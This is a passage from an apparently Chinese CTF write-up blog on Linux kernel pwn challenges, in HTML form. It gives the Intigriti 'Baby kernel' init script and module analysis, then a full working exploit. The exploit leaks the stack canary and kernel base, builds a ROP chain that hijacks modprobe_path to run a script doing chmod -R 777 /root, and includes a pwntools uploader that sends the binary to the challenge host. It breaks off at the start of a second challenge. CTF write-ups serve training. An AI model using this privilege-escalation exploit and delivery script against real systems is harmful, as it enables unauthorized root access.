<span class="nb">chmod </span>644 /etc/passwd
<span class="nb">chmod </span>644 /etc/group

<span class="nb">chown</span> <span class="nt">-R</span> root:root /
<span class="nb">chmod </span>700 <span class="nt">-R</span> /root
<span class="nb">chmod </span>700 <span class="nt">-R</span> /baby.ko
<span class="nb">chown</span> <span class="nt">-R</span> ctf:ctf /home/ctf
<span class="nb">chmod </span>755 /home/ctf
<span class="nb">chmod </span>755 /dev

<span class="nb">hostname </span>intigriti

mount <span class="nt">-t</span> sysfs <span class="nt">-o</span> nodev,noexec,nosuid sysfs /sys
mount <span class="nt">-t</span> devtmpfs <span class="nt">-o</span> nosuid,mode<span class="o">=</span>0755 udev /dev
mount <span class="nt">-t</span> proc <span class="nt">-o</span> nodev,noexec,nosuid proc /proc

<span class="nb">echo </span>2 <span class="o">&gt;</span> /proc/sys/kernel/kptr_restrict
<span class="nb">echo </span>1 <span class="o">&gt;</span> /proc/sys/kernel/dmesg_restrict <span class="c"># /不能使用 dmesg 命令</span>

<span class="nv">FLAG</span><span class="o">=</span><span class="si">$(</span><span class="nb">head</span> <span class="nt">-n</span> 100 /dev/random | <span class="nb">sha256sum</span> | <span class="nb">awk</span> <span class="s1">'{printf $1}'</span><span class="si">)</span>
<span class="nb">mv</span> /flag /root/<span class="nv">$FLAG</span>
<span class="nb">chmod </span>0400 /root/<span class="nv">$FLAG</span>

insmod /baby.ko
<span class="nb">mknod</span> <span class="nt">-m</span> 666 /dev/baby c <span class="si">$(</span><span class="nb">cat</span> /proc/devices | <span class="nb">grep </span>baby | <span class="nb">awk</span> <span class="s1">'{print $1}'</span><span class="si">)</span> 0

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Boot took </span><span class="si">$(</span><span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> /proc/uptime<span class="si">)</span><span class="s2"> seconds</span><span class="se">\n</span><span class="s2">"</span> 
<span class="nb">echo</span> <span class="s2">"[ Baby kernel - Intigriti ]"</span>

<span class="nb">cd</span> /home/ctf
setsid cttyhack setuidgid 1337 sh

umount /proc 
umount /sys
poweroff <span class="nt">-d</span> 0 <span class="nt">-n</span> <span class="nt">-f</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="ko分析"><span class="me-2">ko分析</span><a href="#ko分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>主要就连个功能 read 和 write,</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="kt">size_t</span> <span class="kr">__fastcall</span> <span class="nf">baby_read</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_QWORD</span> <span class="n">src</span><span class="p">[</span><span class="mi">51</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-198h] BYREF</span>

  <span class="n">src</span><span class="p">[</span><span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a3</span> <span class="o">&gt;</span> <span class="mh">0x190</span> <span class="p">)</span> <span class="c1">// 只是判断是不是大于 0x190 ,但是没有做出限制</span>
    <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_3F8</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">a3</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">size_t</span> <span class="kr">__fastcall</span> <span class="nf">baby_write</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_QWORD</span> <span class="n">dest</span><span class="p">[</span><span class="mi">51</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-198h] BYREF</span>

  <span class="n">dest</span><span class="p">[</span><span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a3</span> <span class="o">&gt;</span> <span class="mh">0x190</span> <span class="p">)</span>
    <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_3F8</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">a3</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>通过 read 从 stack 泄露 kernel 地址 和 canary</li>
  <li>再通过 write 进行 kernl 栈溢出，ROP</li>
</ul>

<p>‍</p>

<h3 id="exploit-2"><span class="me-2">exploit</span><a href="#exploit-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">size_t</span> <span class="n">nokaslr_kernel_base</span>  <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">commit_creds</span>         <span class="o">=</span> <span class="mh">0xffffffff810c5010</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">prepare_kernel_cred</span>  <span class="o">=</span> <span class="mh">0xffffffff810c5270</span><span class="p">;</span>


<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="c1">//chmod("/flag",0777);</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_root_shell</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">modprobe_rce</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/chmod -R 777 /root</span><span class="se">\n</span><span class="s">' &gt; /home/ctf/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/ctf/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/ctf/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/ctf/e2"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="n">save_status</span><span class="p">();</span>
    <span class="kt">char</span> <span class="n">procn</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/dev/baby"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x300</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>



    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
  
    <span class="n">hexdump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x300</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">canary</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x190</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>
    <span class="kt">size_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x198</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1ca727</span><span class="p">;</span>

    <span class="n">lss</span><span class="p">(</span><span class="s">"kernel_base"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>
    <span class="n">lss</span><span class="p">(</span><span class="s">"canary"</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xffffffff8100279a</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span><span class="p">);</span> <span class="c1">// pop rdi; ret;</span>
    <span class="kt">size_t</span> <span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xffffffff81001b15</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span><span class="p">);</span> <span class="c1">// pop rsi; ret;</span>
    <span class="kt">size_t</span> <span class="n">mov_rsi</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xffffffff8117b6b7</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span><span class="p">);</span> <span class="c1">//0xffffffff8117b6b7: mov qword ptr [rsi], rdi; ret;;</span>
    <span class="kt">size_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xffffffff82444a40</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xffffffff81c00aa0</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span><span class="p">);</span>


    <span class="kt">size_t</span> <span class="n">ropchain</span><span class="p">[</span><span class="mh">0x250</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>

    <span class="kt">char</span> <span class="n">target1</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/home/ct"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">target2</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"f/e1</span><span class="se">\x00</span><span class="s">"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x190</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>

    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsi</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">target1</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rsi</span><span class="p">;</span>

    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsi</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="o">+</span><span class="mi">8</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">target2</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rsi</span><span class="p">;</span>

    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">modprobe_rce</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>

    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">ropchain</span><span class="p">,</span><span class="mh">0x250</span><span class="p">);</span>

<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>远程</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">cmd</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./run.sh</span><span class="sh">'</span>
<span class="c1">#io = process(cmd.split(' '))
#io = remote('192.168.100.23',32773)
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">babykernel.ctf.intigriti.io</span><span class="sh">'</span><span class="p">,</span><span class="mi">1343</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">$ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">$ </span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#ru('id=1000 gid=1000 groups=1000\r\n')
</span>

<span class="n">exp</span> <span class="o">=</span> <span class="nf">b64encode</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">exploit</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
<span class="n">line_length</span> <span class="o">=</span> <span class="mi">76</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">explist</span> <span class="o">=</span> <span class="p">[</span><span class="n">exp</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">line_length</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">exp</span><span class="p">),</span> <span class="n">line_length</span><span class="p">)]</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">explist</span><span class="p">:</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">echo -n </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">| base64 -d &gt;&gt; /home/ctf/exp</span><span class="sh">'</span>
    <span class="c1">#print(cmd)
</span>    <span class="nf">sl</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">$ </span><span class="sh">'</span><span class="p">)</span>


<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#ru('id=1000 gid=1000 groups=1000\r\n')
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">$ </span><span class="sh">'</span><span class="p">)</span>


<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">cmd</span> <span class="o">=</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;&gt;&gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
    <span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">d</span><span class="o">==</span><span class="sa">b</span><span class="sh">''</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="n">data</span> <span class="o">+=</span> <span class="n">d</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="c1">#print(ru('~ $ ').decode().replace('\r',''))
</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241116195522-9z0suto.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241116195522-9z0suto.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h2 id="2024网鼎杯-半决赛-系统内核漏洞挖掘"><span class="me-2">2024网鼎杯-半决赛-系统内核漏洞挖掘</span><a href="#2024网鼎杯-半决赛-系统内核漏洞挖掘" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="附件-2"><span class="me-2">附件</span><a href="#附件-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>‍</p>

<ul>
  <li>server.py</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="n">Cryptodome.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">subprocess</span>
